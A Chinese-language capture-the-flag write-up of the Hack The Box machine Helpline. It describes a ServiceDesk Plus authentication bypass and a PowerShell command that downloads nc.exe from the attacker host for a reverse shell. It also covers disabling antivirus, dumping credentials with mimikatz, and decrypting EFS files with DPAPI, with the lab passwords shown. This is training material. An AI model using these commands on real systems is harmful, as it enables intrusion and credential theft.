> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/s6P9qaN1Q6sEUN6aVUhPMw)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **86** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/180

靶机难度：高级（4.3/10）

靶机发布日期：2019 年 11 月 13 日

靶机描述：

Helpline is a hard difficulty windows box which needs a good amount of enumeration at each stage. A ServiceDesk web application is found to be vulnerable to XXE exposing sensitive data which gives a foothold. There are hashes on the PostgreSQL database which can be cracked to gain access to a user who can read Windows Event Logs. These logs contain user credentials and can be used to move laterally. Enumeration of the file system reveals a script vulnerable to command injection, which allow for code execution in the context of another user. The local Administrator credentials are then found in the form of powershell securestring.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gOGib2VkpLWkbtKmMsQqySMxAsrxHvBeChSJUKPDZTQH3Gde0ayHZZrpyZNH0ibCdnibeicWkNf9sQ9ldtYghV6EUA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/VHdxGs4QuYyTh2Ph5K8FUYeMSJgG10R6UvAkBSAhsibgPr3lEDRbtNqZKEuMkIHTcB9sm1tjN38OW3gSoLFfDlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXmZ3gqeyCRGeQibh0qcia8whOzoQb3ZBT6Ye2C7pic9C72FS5k3A6qcyibQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.132....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXEYibkPamtMlrej855p0rm40Fvc1pqz3FvacFsHiclicG021x13rwdIhiaA/640?wx_fmt=png)

nmap 发现 SMB 在 445 上打开着，而 WinRM 在端口 5985 上打开着，端口 8080 上运行着一个 Web 应用程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX1ia3Pq8qdC3WnBWUFRFu06oF7DZkZu2vNEjrsbT2YWHOX8oYOn3BbcQ/640?wx_fmt=png)浏览 8080 端口，我们找到一个 ServiceDesk Plus（SDP）应用程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXeTIUTTXxbyemic7AxVa8xgiaNPXvc7nWj8zSocK9pE0icOJ5O0bsRqIkg/640?wx_fmt=png)

尝试用默认账号登陆，成功登陆...guest

这个用户的权限很低...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXoHIpBF5NAcwrRlE7ZCDJ4WOEZDibXrtTwm3foTTkVDYovW8qSwcxc6A/640?wx_fmt=png)

针对 ServiceDesk Plus 在 kali 进行搜索能利用的 exp 有哪些... 可以看到很多，我尝试了几种方法...

这里有几种方法都能成功...

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

利用 35891.txt

这是利用默认密码 guest 用户的用户枚举漏洞...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXBGv2XGicy9wJvsCK8fml96F8fpCrgOkfkGj1iah9qKiaAdcPmkT3wwMGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXRkA8uuqrncuswouibnxiciaMhnDPpWOicOgolicBCb9GcJj1BX9UGFdib7xg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXy1Bjictj5UIibia6MQYjib2h3xs00dZe4lQwfVrY6icic0JTKKOJBh1k9vVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXuqzpmNSUCjPibe3qeVDlkN7Bd8F7u0mCNxG26AumZpGCVfDhdNf06Yg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXNFWXDblJZ1pUStbEagOAx8ktBoWHfeuQ0Iibpb2uvSfldPiccLBEZJNA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXzY4kLqXVFanmDzQUqvQPPNAskHOafadVc8iczibQYGoeibu0ics4oSV3kA/640?wx_fmt=png)

将 / mc/jsp/MCD... 删除，然后访问后即可重定向到 administrator 管理界面...

可看到已进入管理界面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXPEDCecTlbUTlHcQk766wQynibDtY63HqRQhiagbIhEOl2mT8HmdJK3sA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXEpI3rdw6lKoJicKo8z32c4kwykY83JAW3mCaZV6sM3MXYyATHnmoKKw/640?wx_fmt=png)

里面的意思是：可以定义规则以自动调用任何自定义类或脚本文件，在创建、接收或编辑请求时，可以将操作规则应用于该请求...

这里调用 shell 命令，然后创建请求触发即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX4QUs19jibNb27K5RXrjX4VqQQYKRjXrdYnE4v1JwxEZeljicrS2qrwhw/640?wx_fmt=png)

```
powershell -command Invoke-WebRequest http://10.10.14.51/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
```

这里利用 powershell 上传 nc 执行反向 shell 命令即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXe5wOGbJtibjXr0tPiblfwNHLT4Oprv4G6k88rBh6DZyqlKdKotLQTomQ/640?wx_fmt=png)

成功创建好触发器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXI3MLaTXCYf05iaMwVicia4pteTdvqV2Oo6DCgkC4ZBoR2nynBxl5aPOsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXcO9DnVYJc3eeQqHdehwqSR6pldjdumSweRTRBeEfbibVasEdCiaNle1Q/640?wx_fmt=png)

然后回到 Request 创建请求触发，成功 python 服务器上传 nc...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXJ5wNvzX47tbhaCygupibVYBQVEkoXnfTstGy0FJlpN6WTGmNicApdHXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXd1lH1sIaPxwHwtibp2Ge9GanYaMtia7EOItNGDeGkw8HB8OiaVnSuibbSg/640?wx_fmt=png)

同理，重新创建 nc 触发器，简单一句话反弹 shell，可以看到成功获得了 system 外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX5Rbon9E9T1gHnHqRHebMvpiam6UoviaAD9VV5ptvWawcibvgP9DPNIOPA/640?wx_fmt=png)

这是 9.3 的版本，通过 exp 查找 10 版本前都存在 46659（CVE-2019-10008）漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXSc12MbVZJ74nibZ9MVR1DPlDgtp01k58rmQ8yMZzmraFpzgnDhibhuKA/640?wx_fmt=png)

修改需要访问的 IP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXWf7uZvmXy9iaWFjlVJLicaictG0FS5vfoUl65jE82icX9nUSM7wPVnFcyg/640?wx_fmt=png)

F12 修改 cookie 或者利用插件修改也行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXoDp5X2zOBmRTibVlDUY9hkMOy40gQZo2eSVgRrMepoaqryVQxvoibiaRw/640?wx_fmt=png)

修改完后，刷新下界面重定向到了 administrator 管理员界面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXqwanH8dRpibNbz6dicLo9fupSgmRvxlTUk3cHUmjZ5fv27q7z0h2icYJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXJyPa88aBbJfqZHQ9EnrDIbVZao4eI4FkuuXnRjsicXXsnVpOKdnAKMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXQIB2BVGNt2sWZMomfzHiaia2f4gMib5pL1txelxicH8vicQpicKlicLKAuNHw/640?wx_fmt=png)

同理方法 1，这里利用了 nishang 的 tcp.ps1 获取饭箱外壳...

成功获取...

这里应该还有多种漏洞可以进去... 例如 42037

![](https://mmbiz.qpic.cn/mmbiz_png/gOGib2VkpLWkbtKmMsQqySMxAsrxHvBeChSJUKPDZTQH3Gde0ayHZZrpyZNH0ibCdnibeicWkNf9sQ9ldtYghV6EUA/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/VHdxGs4QuYyTh2Ph5K8FUYeMSJgG10R6UvAkBSAhsibgPr3lEDRbtNqZKEuMkIHTcB9sm1tjN38OW3gSoLFfDlA/640?wx_fmt=png)

获取 root 和 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXrtCSJfpcjCIq8icHLHM8sjtRDDowQwlEhlBibs4H545yRRxRQn3AvLvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXl1e7TFEOSMwzVnk35FDZiaGibFUZfu2cwLSu5Hd30WrYR9gF76nHFk8w/640?wx_fmt=png)

可看到使用 system 最高权限也无法读取 user.txt 和 root.tx，通过发现它们都经过 EFS 加密。需要该帐户的明文密码才能恢复主密钥并解密这些文件...

这里利用 mimikatz 工具进行提取密匙...

mimikatz 是用来学习 Windows 安全实验的工具.... 可以从内存中提取纯文本密码，哈希，PIN 码和 kerberos 凭证等等...mimikatz 还可以执行哈希传递，凭证传递或构建 Golden 凭证...

https://github.com/gentilkiwi/mimikatz   -- 下载地址

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXk9cSuqWR0Axuwg1ddRJeHia5W14QeWarL5gdvKxCCJfhufws8IyiaXCA/640?wx_fmt=png)

这里开了防病毒模块，禁用了即可，前面运行的时候无法运行发现的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXhvQ94EBtKxvaHia3ZvkZTSe7OOicmJNAajh01H4a5iaIvicXCdhLecUlcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXgLT6zgfnhaNicJPO9kyMxBGHytWdJQ6fQBAGdF50bZIVZLKTpWEoAAA/640?wx_fmt=png)

```
https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200308
```

下载好后开启服务上传即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXicxcrgAWBOwguXiaQKuw2H12PrWc7CTaElIemT2JNRncGJv79pDoGGGw/640?wx_fmt=png)

成功上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXTcOsULn6Rlb6hKfaa3bW4vzRoK9F3Ex2Z1RkV3mA8DAtOsdOicWCicug/640?wx_fmt=png)

检查可以正常运行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX74Lu9jnoc37Se2vTyYeJJ6vtjXxsa0kb4zx0Bft4maQppe5KXibp8QA/640?wx_fmt=png)

```
.\mimikatz.exe "lsadump::sam" "exit"
```

通过 mimikatz 查询到了所有日志文件里的哈希值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXJBPu2dxKGv83q2fURe1c4wE0tq9lFBj5QRp0LG7Cm9ao7xv6VYYF1A/640?wx_fmt=png)

这里只有 zachary：eef285f4c800bcd1ae1e84c371eeb282 可以破解 NTLM 值...0987654321

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXSmX1bh704ySFW81kGRTRKzicvmVb0ZibysVNSkEdHt41ztrlT6B1C5Zg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXKSDJ3zXTjBvrzcX7zqXa80ibTsV1MDaES0erN9yO8RxddvTsFRE77FQ/640?wx_fmt=png)

上传 ps1 需要用于查询密匙...

```
https://github.com/RamblingCookieMonster/PowerShell/blob/master/Get-WinEventData.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXooo3cubQql5Icf1t81sIVibq0gXznfymWkkicZB8vk9jEx1nLXatDZ5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXKVvKI4mkrhTyKBcmylY0qgibPXIB3ogYmwiaKSe59AIdpSxlBrTtIlow/640?wx_fmt=png)

```
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 1 | Get-WinEventData | fl *
```

这里找到了所有命令行信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXKJdKDnG2RicOzuZuiamtyZNic9mI8UDib4pfiac5MCvWSKLyCaeETraDxyQ/640?wx_fmt=png)

```
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | Select TimeCreated, e_CommandLine | ft -autosize -wrap
```

通过 e_CommandLine 命令行查找到了所有命令行的日志记录... 其中包含了敲打过的密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXY9Od27GjHWkPIrggDeNMJFIqJcEJxyJoJKf18xoVPCSCPdLA5raW3A/640?wx_fmt=png)

可以看到 tolu 在 Remote Management Users 本地组中...

这里利用密码使用 tolu 登陆查看 user 信息，还是无法查看...

这里 google 发现

```
[EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
```

解密思路... 参考  

![](https://mmbiz.qpic.cn/mmbiz_png/gOGib2VkpLWkbtKmMsQqySMxAsrxHvBeChSJUKPDZTQH3Gde0ayHZZrpyZNH0ibCdnibeicWkNf9sQ9ldtYghV6EUA/640?wx_fmt=png)

User.txt 获取

![](https://mmbiz.qpic.cn/mmbiz_png/VHdxGs4QuYyTh2Ph5K8FUYeMSJgG10R6UvAkBSAhsibgPr3lEDRbtNqZKEuMkIHTcB9sm1tjN38OW3gSoLFfDlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

请参考上面链接方法进行！

第一步：获取证书

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXiaMWr3ZOicrw1mYXBhh0Q1gniat22SjQH8JEYbUibxjhQGzsbJ3DVvPcyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXX329j6sKP1jAuCuKOSTFzhhvvubHicUVUmBLlGq59iclQSic6CKaam4EA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXOE0ktPsgvDicSUGnLf2BxbclHuLqXia32Ydo8E61EdkicduQCicpVwN88w/640?wx_fmt=png)

```
.\mimikatz.exe "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXmUtcnqLYkrAbicVauQcD0kaicjpeWjKsXMZuFOUF1UmH844WLsO04P5Q/640?wx_fmt=png)

通过 mimikatz 获得了 certificate...

第二步：解密万能密匙

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXSic6ciacRaiablR0ar5Ymc2NKmZV3gxf6jVdjuMxaf1ECQdtpRh3rlMHQ/640?wx_fmt=png)需要找到 masterkey...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX5pusU9wdEhRQOQPr9qKpMxZJs5LAytC7hP7TttB86wQvtII4uQrI3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXiacic5lfGAwO6AWibd0XWEo3IOz4sBdvy4iaDMgYKibZGguMctCKYsaXNfg/640?wx_fmt=png)

```
.\mimikatz.exe "dpapi::masterkey /in:C:\users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
```

这里获得了 key 和 sha1，两者都可以利用，用其一即可...

第三步：解密密匙

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXaUsP5PA7Jmm3UfZZjdGCve2yUxCdtwDKu1UibG8yeGaiakslFgVrM5aQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXjuKicMAibvrcic0FP5B2wyCXchampIUYZF6hiajtREPhUoTJzZ2Jpthib9Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXzxqAicYc5jAUdIKYK1FWRqiaIicpiag2JQsmIAI9vTd3YmFZC8nIM7Iiaew/640?wx_fmt=png)

```
.\mimikatz.exe "dpapi::capi /in:C:\users\tolu\AppData\Roaming\Microsoft\Crypto\rsa\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXdicrtC1dIpBYK5DDxZXK2VARrN0Vt8Fmy3fPQXuoU405xkicAW3MNCSw/640?wx_fmt=png)

利用 dpapi::capi 在文件中获得了私钥，并通过 smb 共享文件到本地...

第四步：建立正确的 PFX

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXjZcW6Huk8ibecvNpibNxiclAB52LqzRws6vnwhbb8QCwb125yLqibiaRHUQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXicl3iaNgtbNqv8yhAAY5xJvOrz9ywl2N7F8vKaAkly38SdCV56GWdRFg/640?wx_fmt=png)

```
openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
openssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

利用 OpenSSL1 版本建立 PFX

第五步：安装 PFX

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXyXN270ib1wgORGIqJS6sDJnttzn6BfBLy4PNPk71ZapajESZCYK0h1w/640?wx_fmt=png)

```
certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
```

利用 mimikatz 成功获得 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

这里也可以使用 Invoke-Command 读取到 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX2Mm3IwOicCGibcSQZNL0nrIcsibDbeMx25ZibKX6JMfGQib1cXFJGMzwKmA/640?wx_fmt=png)

```
$username = "Helpline\tolu"

$password = "!zaq1234567890pl!99"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
```

成功获得 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

root.txt 获取

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

这里和 user 获取方法一样，首先需要获得管理员的密码才能进行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXTnggkIvKEFmGJDn1ibMJhMia1cuQhXE8M4tQ99Gv0kHOQRYHeqvx6MHw/640?wx_fmt=png)

在 leo 用户下找到 pass 文件，密码应该在里面，又加密了，利用共享和别的方式都无法下载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX8lZglxftqrVfibNHZfMa7ryEYgda9zMibUAIjKPDvLOZfdeiaD0lJIW6w/640?wx_fmt=png)

需求是能够阅读他，发现内容密码即可...

这里我利用了 MSF 尝试模拟 leo 令牌去阅读内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX1kTgDFmvohKP5gxWMBD80OmMdDIhAqlKkdVj9AicO3M8xUC6jGmXEng/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpX6PzULARvlnnhzthDLibiayswaYdsPZHjEVUG6UH5uEeiaBQRgqgNnGjicA/640?wx_fmt=png)

成功读取内容，这里也可以通过登陆到 leo 用户去查看也可以查看到内容...

```
https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text
```

利用上面链接方法，在 powershell 中加载获取密匙...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXmTVZund3GyknHWqcfHNpCaEpt2eoVungHkyWWOeutyjx0NrzMDao5w/640?wx_fmt=png)

成功获得了 administrator 的密匙...

下面开始按照 user 方法 1 开始同理获得信息即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXWu2MTrhWVCNTUztChJXQ9ziakf2kuXr4lqqEFiauiclMcWiaewicEQhGb5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXGp8icF0wbsXNuGlwSvffz7tZU4iavVFoUKCZaiaCpzGS29JjTEvl4XyZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXp9Af7foEzkhxMFHk0AkiaPgRy9ZYXHOcdw0c5pdvAQOthJng4r8yajQ/640?wx_fmt=png)

和 user 方法 1 一样，利用 EFS 方法，获得了 root 信息... 这里就不多讲解了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO5w5PP77QvqK1esfc6stpXn6cqRc9ibdqR2JaMM65S8u2YOkI8aH3X2jAkApVvDeg8JTUsTcZAH6Q/640?wx_fmt=png)

和 user 方法 2 一样，利用 powershell 的 Invoke-Command 中 Get-Content 读取 admin-pass.xml 然后查看到了 root 信息...

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?wx_fmt=png)

后面开始按照日常更新把，多学多累积

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)